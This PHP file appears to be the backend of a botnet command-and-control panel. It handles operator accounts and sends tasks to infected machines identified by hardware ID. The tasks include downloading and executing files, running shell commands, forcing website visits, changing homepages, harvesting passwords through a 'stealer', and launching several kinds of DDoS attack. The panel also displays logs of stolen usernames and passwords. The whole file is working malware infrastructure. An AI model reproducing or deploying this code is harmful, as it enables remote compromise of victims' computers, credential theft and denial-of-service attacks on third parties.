<?php
function UniqueID($value)
{
    $charset   = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    $randomize = substr(str_shuffle($charset), $value, $value);

    return $randomize;
}

function GrabCountry($ip)
{
    $api     = file_get_contents('http://geoip.nekudo.com/api/' . $ip);
    $decode  = json_decode($api, true);
    $country = $decode['country']['name'];
    return $country;
}

function GrabOS($osname)
{
    if(strpos($osname,'NT')!==false) {
        $os_array = array(
            '/windows nt 10.0/i' => 'Windows 10',
            '/windows nt 6.3/i' => 'Windows 8.1',
            '/windows nt 6.2/i' => 'Windows 8',
            '/windows nt 6.1/i' => 'Windows 7',
            '/windows nt 6.0/i' => 'Windows Vista',
            '/windows nt 5.2/i' => 'Windows Server 2003/XP x64',
            '/windows nt 5.1/i' => 'Windows XP',
            '/windows xp/i' => 'Windows XP'
        );

        foreach ($os_array as $os => $value) {
            if (preg_match($os, $osname)) {
                $osname = $value;
                break;
            }
        }
    }

    return str_replace('Microsoft ','',$osname);
}

function Ago($time)
{
    $periods = array(" Second", " Minute", " Hour", " Day", " Week", " Month", " Year", " Decade");
    $lengths = array("60","60","24","7","4.35","12","10");
    $now = time();
    $difference = $now - $time;
    $tense      = " ago";
    for($j = 0; $difference >= $lengths[$j] && $j < count($lengths)-1; $j++)
    {
        $difference /= $lengths[$j];
    }
    $difference = round($difference);

    if($difference != 1)
    {
        $periods[$j] .= "s";
    }
    return $difference . $periods[$j] . $tense;
}

function getPass($username, $password)
{
    global $con;
    $getsalt = $con->prepare("SELECT salt FROM `users` WHERE username = ?");
    $getsalt->execute(array($username));
    return md5(sha1($password.'$2a$09$'.$getsalt->fetch()[0]));
}

function Login()
{
    if(isset($_POST['login']))
    {
        global $con;
        if(!empty($_POST['username']) && !empty($_POST['password']))
        {
            $username = strtolower($_POST['username']);
            $password = getPass($username,$_POST['password']);

            $data = $con->prepare("SELECT COUNT(*) FROM `users` WHERE username = :username AND password = :password AND access = 1");
            $data->execute(array(':username' => $username, ':password' => $password));

            if($data->fetch()[0] > 0)
            {
                $_SESSION['username'] = $username;
                echo '<font color="limegreen">Logging in..</font>';
                echo '<script>setTimeout(function(){location.href="index.php";},3000);</script>';
                exit();
            }
            else
                echo '<font color="red">Error: Authentication failed!</font>';
        }
        else
            echo '<font color="red">Error: All fields required!</font>';
    }
}

function Register($access=0/*0 = No Access | 1 = Full Access*/)
{
    if(isset($_POST['register'])) {
        global $con;
        if (!empty($_POST['username']) && !empty($_POST['password']) && !empty($_POST['repassword'])) {
            $username = strtolower($_POST['username']);
            $password = $_POST['password'];
            $repassword = $_POST['repassword'];
            $salt = UniqueID(10);

            if ($repassword == $password) {
                $password = md5(sha1($password . '$2a$09$' . $salt));

                if(!ctype_alnum($username)) die('<font color="red">Username must be alphanumeric</font>');

                $check = $con->prepare("SELECT COUNT(*) FROM `users` WHERE username = ?");
                $check->execute(array($username));
                if ($check->fetch()[0] < 1) {
                    echo '<font color="limegreen">User Registered!</font>';
                    //Insert user data into database
                    $con->prepare("INSERT INTO `users` (username, password, salt, access) VALUES(:username, :password, :salt, :access)")->execute(
                        array(
                            ':username' => $username,
                            ':password' => $password,
                            ':access' => $access,
                            ':salt' => $salt
                        )
                    );
                    if (file_exists('install.php')){
                        unlink('css/install.css');
                        unlink('install.php');
                        $con->prepare("UPDATE settings SET super=?")->execute(array($username));
                        redirect();
                    }
                    else if (strpos($_SERVER['HTTP_REFERER'], 'management.php') === false)
                        redirect();
                    exit();
                } else
                    echo '<font color="red">Error: Username already taken!</font>';
            } else
                echo '<font color="red">Error: Passwords does not match!</font>';
        } else
            echo '<font color="red">Error: All fields required!</font>';
    }
}

function redirect(){
    echo '<font color="limegreen"> Redirecting...</font>';
    echo '<script>setTimeout(function(){location.href="index.php";},3000);</script>';
}

function AuthenticatedCheck($value)
{
    switch($value)
    {
        case 'LoggedOut':
            if(!isset($_SESSION['username']))
                header('Location: login.php');
            break;
        case 'LoggedIn':
            if(isset($_SESSION['username']))
                header('Location: index.php');
            break;
    }
}

function Logout()
{
    if(isset($_GET['logout']))
        unset($_SESSION['username']);
}

function DLExecute()
{
    if(isset($_POST['exec']))
    {
        if(!empty($_POST['link']))
        {
            $link = $_POST['link'];
            if(filter_var($link, FILTER_VALIDATE_URL))
                insertTask($_POST['hwid'], 'exec', $link);
            else
                echo '<font color="red">Error: Url not valid!</font>';
        }
        else
            echo '<font color="red">Error: Url field can\'t be blank!</font>';
    }
}

function DLCMD()
{
    if(isset($_POST['cmd']))
    {
        if(!empty($_POST['command']))
            insertTask($_POST['hwid'], 'cmd', base64_encode($_POST['command']));
        else
            echo '<font color="red">Error: Command field can\'t be blank!</font>';
    }
}

function DLVisit()
{
    if(isset($_POST['visit']))
    {
        if(!empty($_POST['url']))
        {
            $url = $_POST['url'];
            $visible = isset($_POST['visible']) ? (int)(bool)$_POST['visible'] : 0;
            if(filter_var($url, FILTER_VALIDATE_URL))
                insertTask($_POST['hwid'], 'visit', $url.' '.$visible);
            else
                echo '<font color="red">Error: Url not valid!</font>';
        }
        else
            echo '<font color="red">Error: Url field can\'t be blank!</font>';
    }
}

function DLUnin()
{
    if(isset($_POST['kill']))
        insertTask($_POST['hwid'],"uninstall","");
}

function DLDDoS()
{
    if(isset($_POST['ddos']))
    {
        if (!empty($_POST['target']) && !empty($_POST['time']) && !empty($_POST['type']))
        {
            $target = $_POST['target'];
            $port = $_POST['port'];
            $time = $_POST['time'];
            $type = $_POST['type'];
            $http = isHttp($type);
            if(!filter_var($target, $http?FILTER_VALIDATE_URL:FILTER_VALIDATE_IP))
                echo '<font color="red">Error: '.($http?'Website':'IP').' not valid!</font>';
            elseif(!$http && !in_array($port,range(0,65507)))
                echo '<font color="red">Error: Port not valid! Range 0-65507</font>';
            elseif(!(is_numeric($time) && (int)$time > 0))
                echo '<font color="red">Error: Time not valid!</font>';
            elseif(!in_array($type,array('udp','flood','syn','ntp','xmlrpc','slowloris','arme')))
                echo '<font color="red">Error: Type not valid!</font>';
            else
                insertTask($_POST['hwid'], $type, $target.' '.($http?'':$port.' ').(int)$time);
        }
        else
            echo '<font color="red">Error: Target, Type and Time fields can\'t be blank!</font>';
    }
}

function DLHome()
{
    if(isset($_POST['home'])){
        $page = $_POST['page'];
        if(!filter_var($page, FILTER_VALIDATE_URL))
            echo '<font color="red">Error: Invalid url!</font>';
        else
            insertTask($_POST['hwid'], 'home', $page);
    }
}

function isHttp($type){
    return in_array($type,array('flood','xmlrpc','slowloris','arme'));
}

function DLPass()
{
    $e = explode('ajax',$_SERVER['REQUEST_URI']);
    if(isset($_POST['pass']))
        insertTask($_POST['hwid'], 'stealer', 'http' . (isset($_SERVER['HTTPS']) ? 's' : '') . '://' . $_SERVER['HTTP_HOST'] . $e[0]);
}

function insertTask(array $hwids, $command, $parameter)
{
    global $con;
    $hwids = isset($_POST['checkall']) && $_POST['checkall'] ? $con->query("SELECT hwid FROM bots WHERE (UNIX_TIMESTAMP()-time) <= 20")->fetchAll(PDO::FETCH_COLUMN) : $hwids;
    foreach ($hwids as $hwid)
        //insert task in the db
        $con->prepare("INSERT INTO tasks(hwid,command,parameter,completed,time) VALUES(:hwid,:command,:parameter,0,:time)")->execute(
            array(
                ':hwid' => $hwid,
                ':command' => $command,
                ':parameter' => $parameter . (isset($_POST['pass'])?' '.$hwid:''),
                ':time' => time()
            )
        );
    echo '<font color="limegreen">Task successfully added</font>';
}

function printTasks($type)
{
    global $con;
    $commands = array('exec' => 'Download & Execute','visit' => 'Visit Website',
        'cmd' => 'Shell Command', 'uninstall' => 'Uninstall', 'stealer' => 'Password Recovery', 'home' => 'Change Homepage');
    foreach($con->query("SELECT * FROM tasks WHERE completed = $type ORDER BY time DESC LIMIT 5")->fetchAll(PDO::FETCH_OBJ) as $row){
        $command = in_array($row->command,array_keys($commands)) ? $commands[$row->command] : 'DDOS Attack';
        $time = Ago($row->time);
        $delete = "<img src='img/icons/delete.png' width='16' height='16' class='delete' id='$row->id'>";
        echo <<<OUT
<tr>
	<td>$row->id</td>
	<td>$command</td>
	<td>$row->hwid</td>
	<td>$time</td>
    <td>$delete</td>
</tr>
OUT;
    }
}

function printUsers($init,$end)
{
    global $con;
    foreach($con->query("SELECT * FROM `users` ORDER BY id DESC LIMIT $init, $end")->fetchAll(PDO::FETCH_OBJ) as $row){
        $edit = "<img src='img/icons/edit.png' width='18' height='18' class='edit' id='$row->id'>";
        $delete = "<img src='img/icons/delete.png' width='16' height='16' class='delete' id='$row->id'>";
        $access = $row->access ? 'Yes' : 'No';
        echo <<<OUT
<tr>
	<td>$row->id</td>
	<td>$row->username</td>
	<td>$access</td>
	<td>$edit</td>
    <td>$delete</td>
</tr>
OUT;
    }
}

function printLogs($init,$end,$search)
{
    global $con, $like;
    $data = $con->prepare("SELECT * FROM `logs` $like ORDER BY time DESC LIMIT $init, $end");
    $data->execute(array(':search' => '%'.$search.'%'));
    foreach($data->fetchAll(PDO::FETCH_OBJ) as $row) {
        $time = Ago($row->time);
        $url = str_replace(':/','://',$row->url);
        echo <<<OUT
<tr>
	<td>$row->hwid</td>
	<td><a href="$url" target="_BLANK">$url</a></td>
	<td>$row->username</td>
	<td>$row->password</td>
    <td>$time</td>
</tr>
OUT;
    }
}